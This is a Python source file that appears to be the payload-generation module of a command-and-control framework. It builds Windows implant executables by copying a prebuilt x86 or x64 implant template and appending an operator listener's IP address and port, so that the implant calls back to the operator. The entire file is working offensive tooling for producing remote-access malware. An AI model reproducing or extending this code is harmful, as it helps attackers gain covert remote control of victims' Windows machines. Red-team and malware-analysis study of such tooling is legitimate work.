from util import *
from database import *
from server import *

from shutil import copyfile, ignore_patterns

payloads = {
    "winexe" : "Windows executable"
}

list_payloads   = [payload for payload in payloads]
list_arch       = ["x86", "x64"]

# Check if payload option exists
def checkPayloadExist(name, flag):
    if name in list_payloads:
        return True
    else:
        if flag == 1:
            error("Invalid payload entered!")
            return False
        else:
            return False

# Check payload arch
def checkPayloadArch(arch, flag):
    if arch in list_arch:
        return True
    else:
        if flag == 1:
            error("Invalid arch entered!")
            return False
        else:
            return False

# List payload options
def listPayload():
    success("Payload List:")
    print("-" * 97)
    print('| {:<25} | {:<65} |'.format("Payload Type", "Descriptions"))
    print("-" * 97)
    for i in payloads:
        print('| {:<25} | {:<65} |'.format(i, payloads[i]))
    print("-" * 97)
    print(" ")

# Generate payload
def generatePayload(args):
    if len(args) != 4:
        error("Invalid arguments. (eg., [ payloads ] > generate <type> <arch> <listener> <output>)")
        return 0
    else:
        payloadType     = args[0]
        payloadArch     = args[1]
        payloadListener = args[2]
        payloadName     = args[3]

    if checkPayloadExist(payloadType, 1) == False:
        return 0
    if checkListenerEmpty(1) == True:
        return 0
    if checkListenerExist(payloadListener, 1) == False:
        return 0
    if checkPayloadArch(payloadArch, 1) == False:
        return 0
    
    if payloadType == "winexe":
        winexe(payloadListener, payloadArch, payloadName)
    


####################### PAYLOAD TYPES #######################
# Winexe payload (C++)
def winexe(listener, arch, name):
    outpath = f'/tmp/{name}'
    ip      = listeners[listener].ipAddress
    port    = listeners[listener].port

    if arch == "x86":
        copyfile("./implant/templates/winexe/winexe32.exe", outpath)
    elif arch == "x64":
        copyfile("./implant/templates/winexe/winexe64.exe", outpath)

    with open(outpath, "a") as f:   # "a" - open for writing
        f.write(f'{ip}\n{port}')
    success(f'Payload saved in: {outpath}')

